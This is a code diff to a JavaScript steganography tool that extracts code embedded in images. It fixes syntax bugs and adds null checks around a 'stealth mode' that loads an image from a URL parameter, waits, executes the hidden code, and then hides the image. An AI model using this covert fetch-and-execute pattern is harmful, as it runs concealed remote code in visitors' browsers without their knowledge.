@@ -4,9 +4,9 @@ const MAGIC_JPG = "JSTEGV1\n";
 const JPEG_EOI = "\xff\xd9";
 
 // DOM elements
-const loadingOverlay = document.getElementById('loadingOverlay');
-const displayImage = document.getElementById('displayImage');
-const imageViewer = document.getElementById('imageViewer');
+let loadingOverlay = document.getElementById('loadingOverlay');
+let displayImage = document.getElementById('displayImage');
+let imageViewer = document.getElementById('imageViewer');
 
 // Check for stealth mode (image URL in query parameters)
 let stealthMode = false;
@@ -174,7 +174,7 @@ function parsePayloadBytes(data, magicBytes) {
 
     // Only keep the filename itself. This mirrors extract.py's
     // basename protection and prevents directory-like names.
-    originalFilename = originalFilename.split(/[/\$$/).pop();
+    originalFilename = originalFilename.split(/[/\\\\]/).pop();
 
     if (!originalFilename) {
         throw new Error('Invalid embedded filename.');
@@ -270,7 +270,7 @@ async function extractCodeFromImage(canvas, filename, rawBytes = null) {
             }
 
             if (!response.ok) {
-                throw new Error(`Could not download the JPEG (HTTP \${response.status}).`);
+                throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
             }
 
             rawBytes = new Uint8Array(await response.arrayBuffer());
@@ -289,7 +289,11 @@ async function extractCodeFromImage(canvas, filename, rawBytes = null) {
 }
 
 // Check for image URL in query parameters
-window.addEventListener('load', ()) => {
+window.addEventListener('load', () => {
+    loadingOverlay = loadingOverlay || document.getElementById('loadingOverlay');
+    displayImage = displayImage || document.getElementById('displayImage');
+    imageViewer = imageViewer || document.getElementById('imageViewer');
+
     const urlParams = new URLSearchParams(window.location.search);
     const imageUrl = urlParams.get('image');
     
@@ -298,11 +302,11 @@ window.addEventListener('load', ()) => {
         stealthMode = true;
         
         // Show the image viewer
-        imageViewer.style.display = 'flex';
-        loadingOverlay.style.display = 'flex';
+        if (imageViewer) imageViewer.style.display = 'flex';
+        if (loadingOverlay) loadingOverlay.style.display = 'flex';
         
         // Set the image source
-        displayImage.src = imageUrl;
+        if (displayImage) displayImage.src = imageUrl;
         
         // Load the image from the URL. JPEG extraction uses raw bytes,
         // while PNG/BMP/TIFF extraction requires CORS-enabled pixels.
@@ -314,7 +318,7 @@ window.addEventListener('load', ()) => {
         
         img.onload = async function() {
             // Hide the loading overlay
-            loadingOverlay.style.display = 'none';
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
             
             // Wait for 5 seconds before extracting and executing code
             setTimeout(async () => {
@@ -351,7 +355,7 @@ window.addEventListener('load', ()) => {
                     await extractCodeFromImage(canvas, imageUrl, rawBytes);
                     
                     // Hide the image after code execution
-                    imageViewer.style.display = 'none';
+                    if (imageViewer) imageViewer.style.display = 'none';
                 } catch (error) {
                     console.error('Error extracting code:', error.message);
                     
